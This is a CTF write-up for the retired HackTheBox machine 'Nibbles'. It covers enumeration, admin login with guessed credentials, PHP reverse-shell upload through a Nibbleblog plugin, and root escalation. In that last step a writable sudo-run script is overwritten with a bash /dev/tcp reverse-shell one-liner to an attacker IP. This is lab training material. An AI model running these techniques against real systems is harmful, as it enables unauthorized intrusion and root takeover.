---
title: HTB - Nibbles writeup
date: 2025-08-21 08:00:00 +0000
categories:
  - CTF
  - HTB
tags:
  - CTF
  - HTB
  - easy
  - enumeration
  - privilege-escalation
---

---

![Nibbles Box](/assets/images/nibbles/NIBBLES.png)

**OS :** Linux  
**Difficulty :** Easy  
**Machine IP :** 10.10.10.75

Nibbles is an easy retired box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration for privilege escalation.

---

## Enumeration

First, we need to scan our target using `nmap` to see the open ports and services running on the target.  
![Nmap Scan](/assets/images/nibbles/nmap_scan.png)

We get:

- SSH open on port 22
    
- HTTP open on port 80
    

Let’s check port 80, but first let’s add the IP address to our `/etc/hosts`:  
![Domain Name](/assets/images/nibbles/domain_name.png)

Now that we’ve added the host, let’s check out the website:  
![Web View](/assets/images/nibbles/web_view.png)

We get nothing here… but after checking the source code, I found a hidden web directory: `/nibbleblog/`.  
![Source Page](/assets/images/nibbles/source_page.png)

Accessing this directory shows us a blog:  
![Blog Page](/assets/images/nibbles/blog_page.png)

Next, I did some directory enumeration to see if there were any hidden files or directories. Using the `common.txt` wordlist, I got:  
![[dir_enum.png]]  
![[dir_enum_result.png]]

There are some interesting results. The first thing I checked was the `README` file:  
![[readme.png]]

It shows `Nibbleblog v4.0.3`.

Searching online, I found that it’s a CMS vulnerable to **Arbitrary File Upload**. To exploit this, we need credentials for the admin page.

After some enumeration, I discovered the username `admin`.  
![[username.png]]

I couldn’t find the password at first, but after a few guesses, I ended up with:

```
admin:nibbles
```

Now with credentials, I went to GitHub to check how to get RCE. From the code, I learned I need to upload a PHP reverse shell in `/content/private/plugins/my_image/`.  
![[github.png]]

So I went to the admin dashboard → Plugins → My Image → uploaded my reverse shell.  
![[reverse_shell.png]]  
![[uploaded_image.png]]

---

## Getting a Shell

Then I set up a Netcat listener:  
![[get_shell.png]]

Got the shell! I upgraded it with:

```bash
script /dev/null -c bash
```

![[shell_upgrade.png]]

We are now the user `nibbler`. In the home directory, I grabbed the first flag:  
![[first_flag.png]]

---

## Privilege Escalation

I ran:

```bash
sudo -l
```

![[sudo-l.png]]

It showed that we can run the `monitor.sh` script as root. After unzipping the `personal.zip` file, I got the script.  
![[the zip fie.png]]

Checking the file, I noticed I had write permission. So I overwrote it with a reverse shell:

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.29/6666 0>&1'" > monitor.sh
```

![[overrideFile.png]]

Then I started another Netcat listener:  
![[root_reverse_shell.png]]

Finally, I ran the script as root:

```bash
sudo ./monitor.sh
```

![[run the reverse shell.png]]

And we got a **root shell**!  
![[get_root_shell.png]]

Grabbed the root flag:  
![[root_flag.png]]

---

and we are DONE  :)
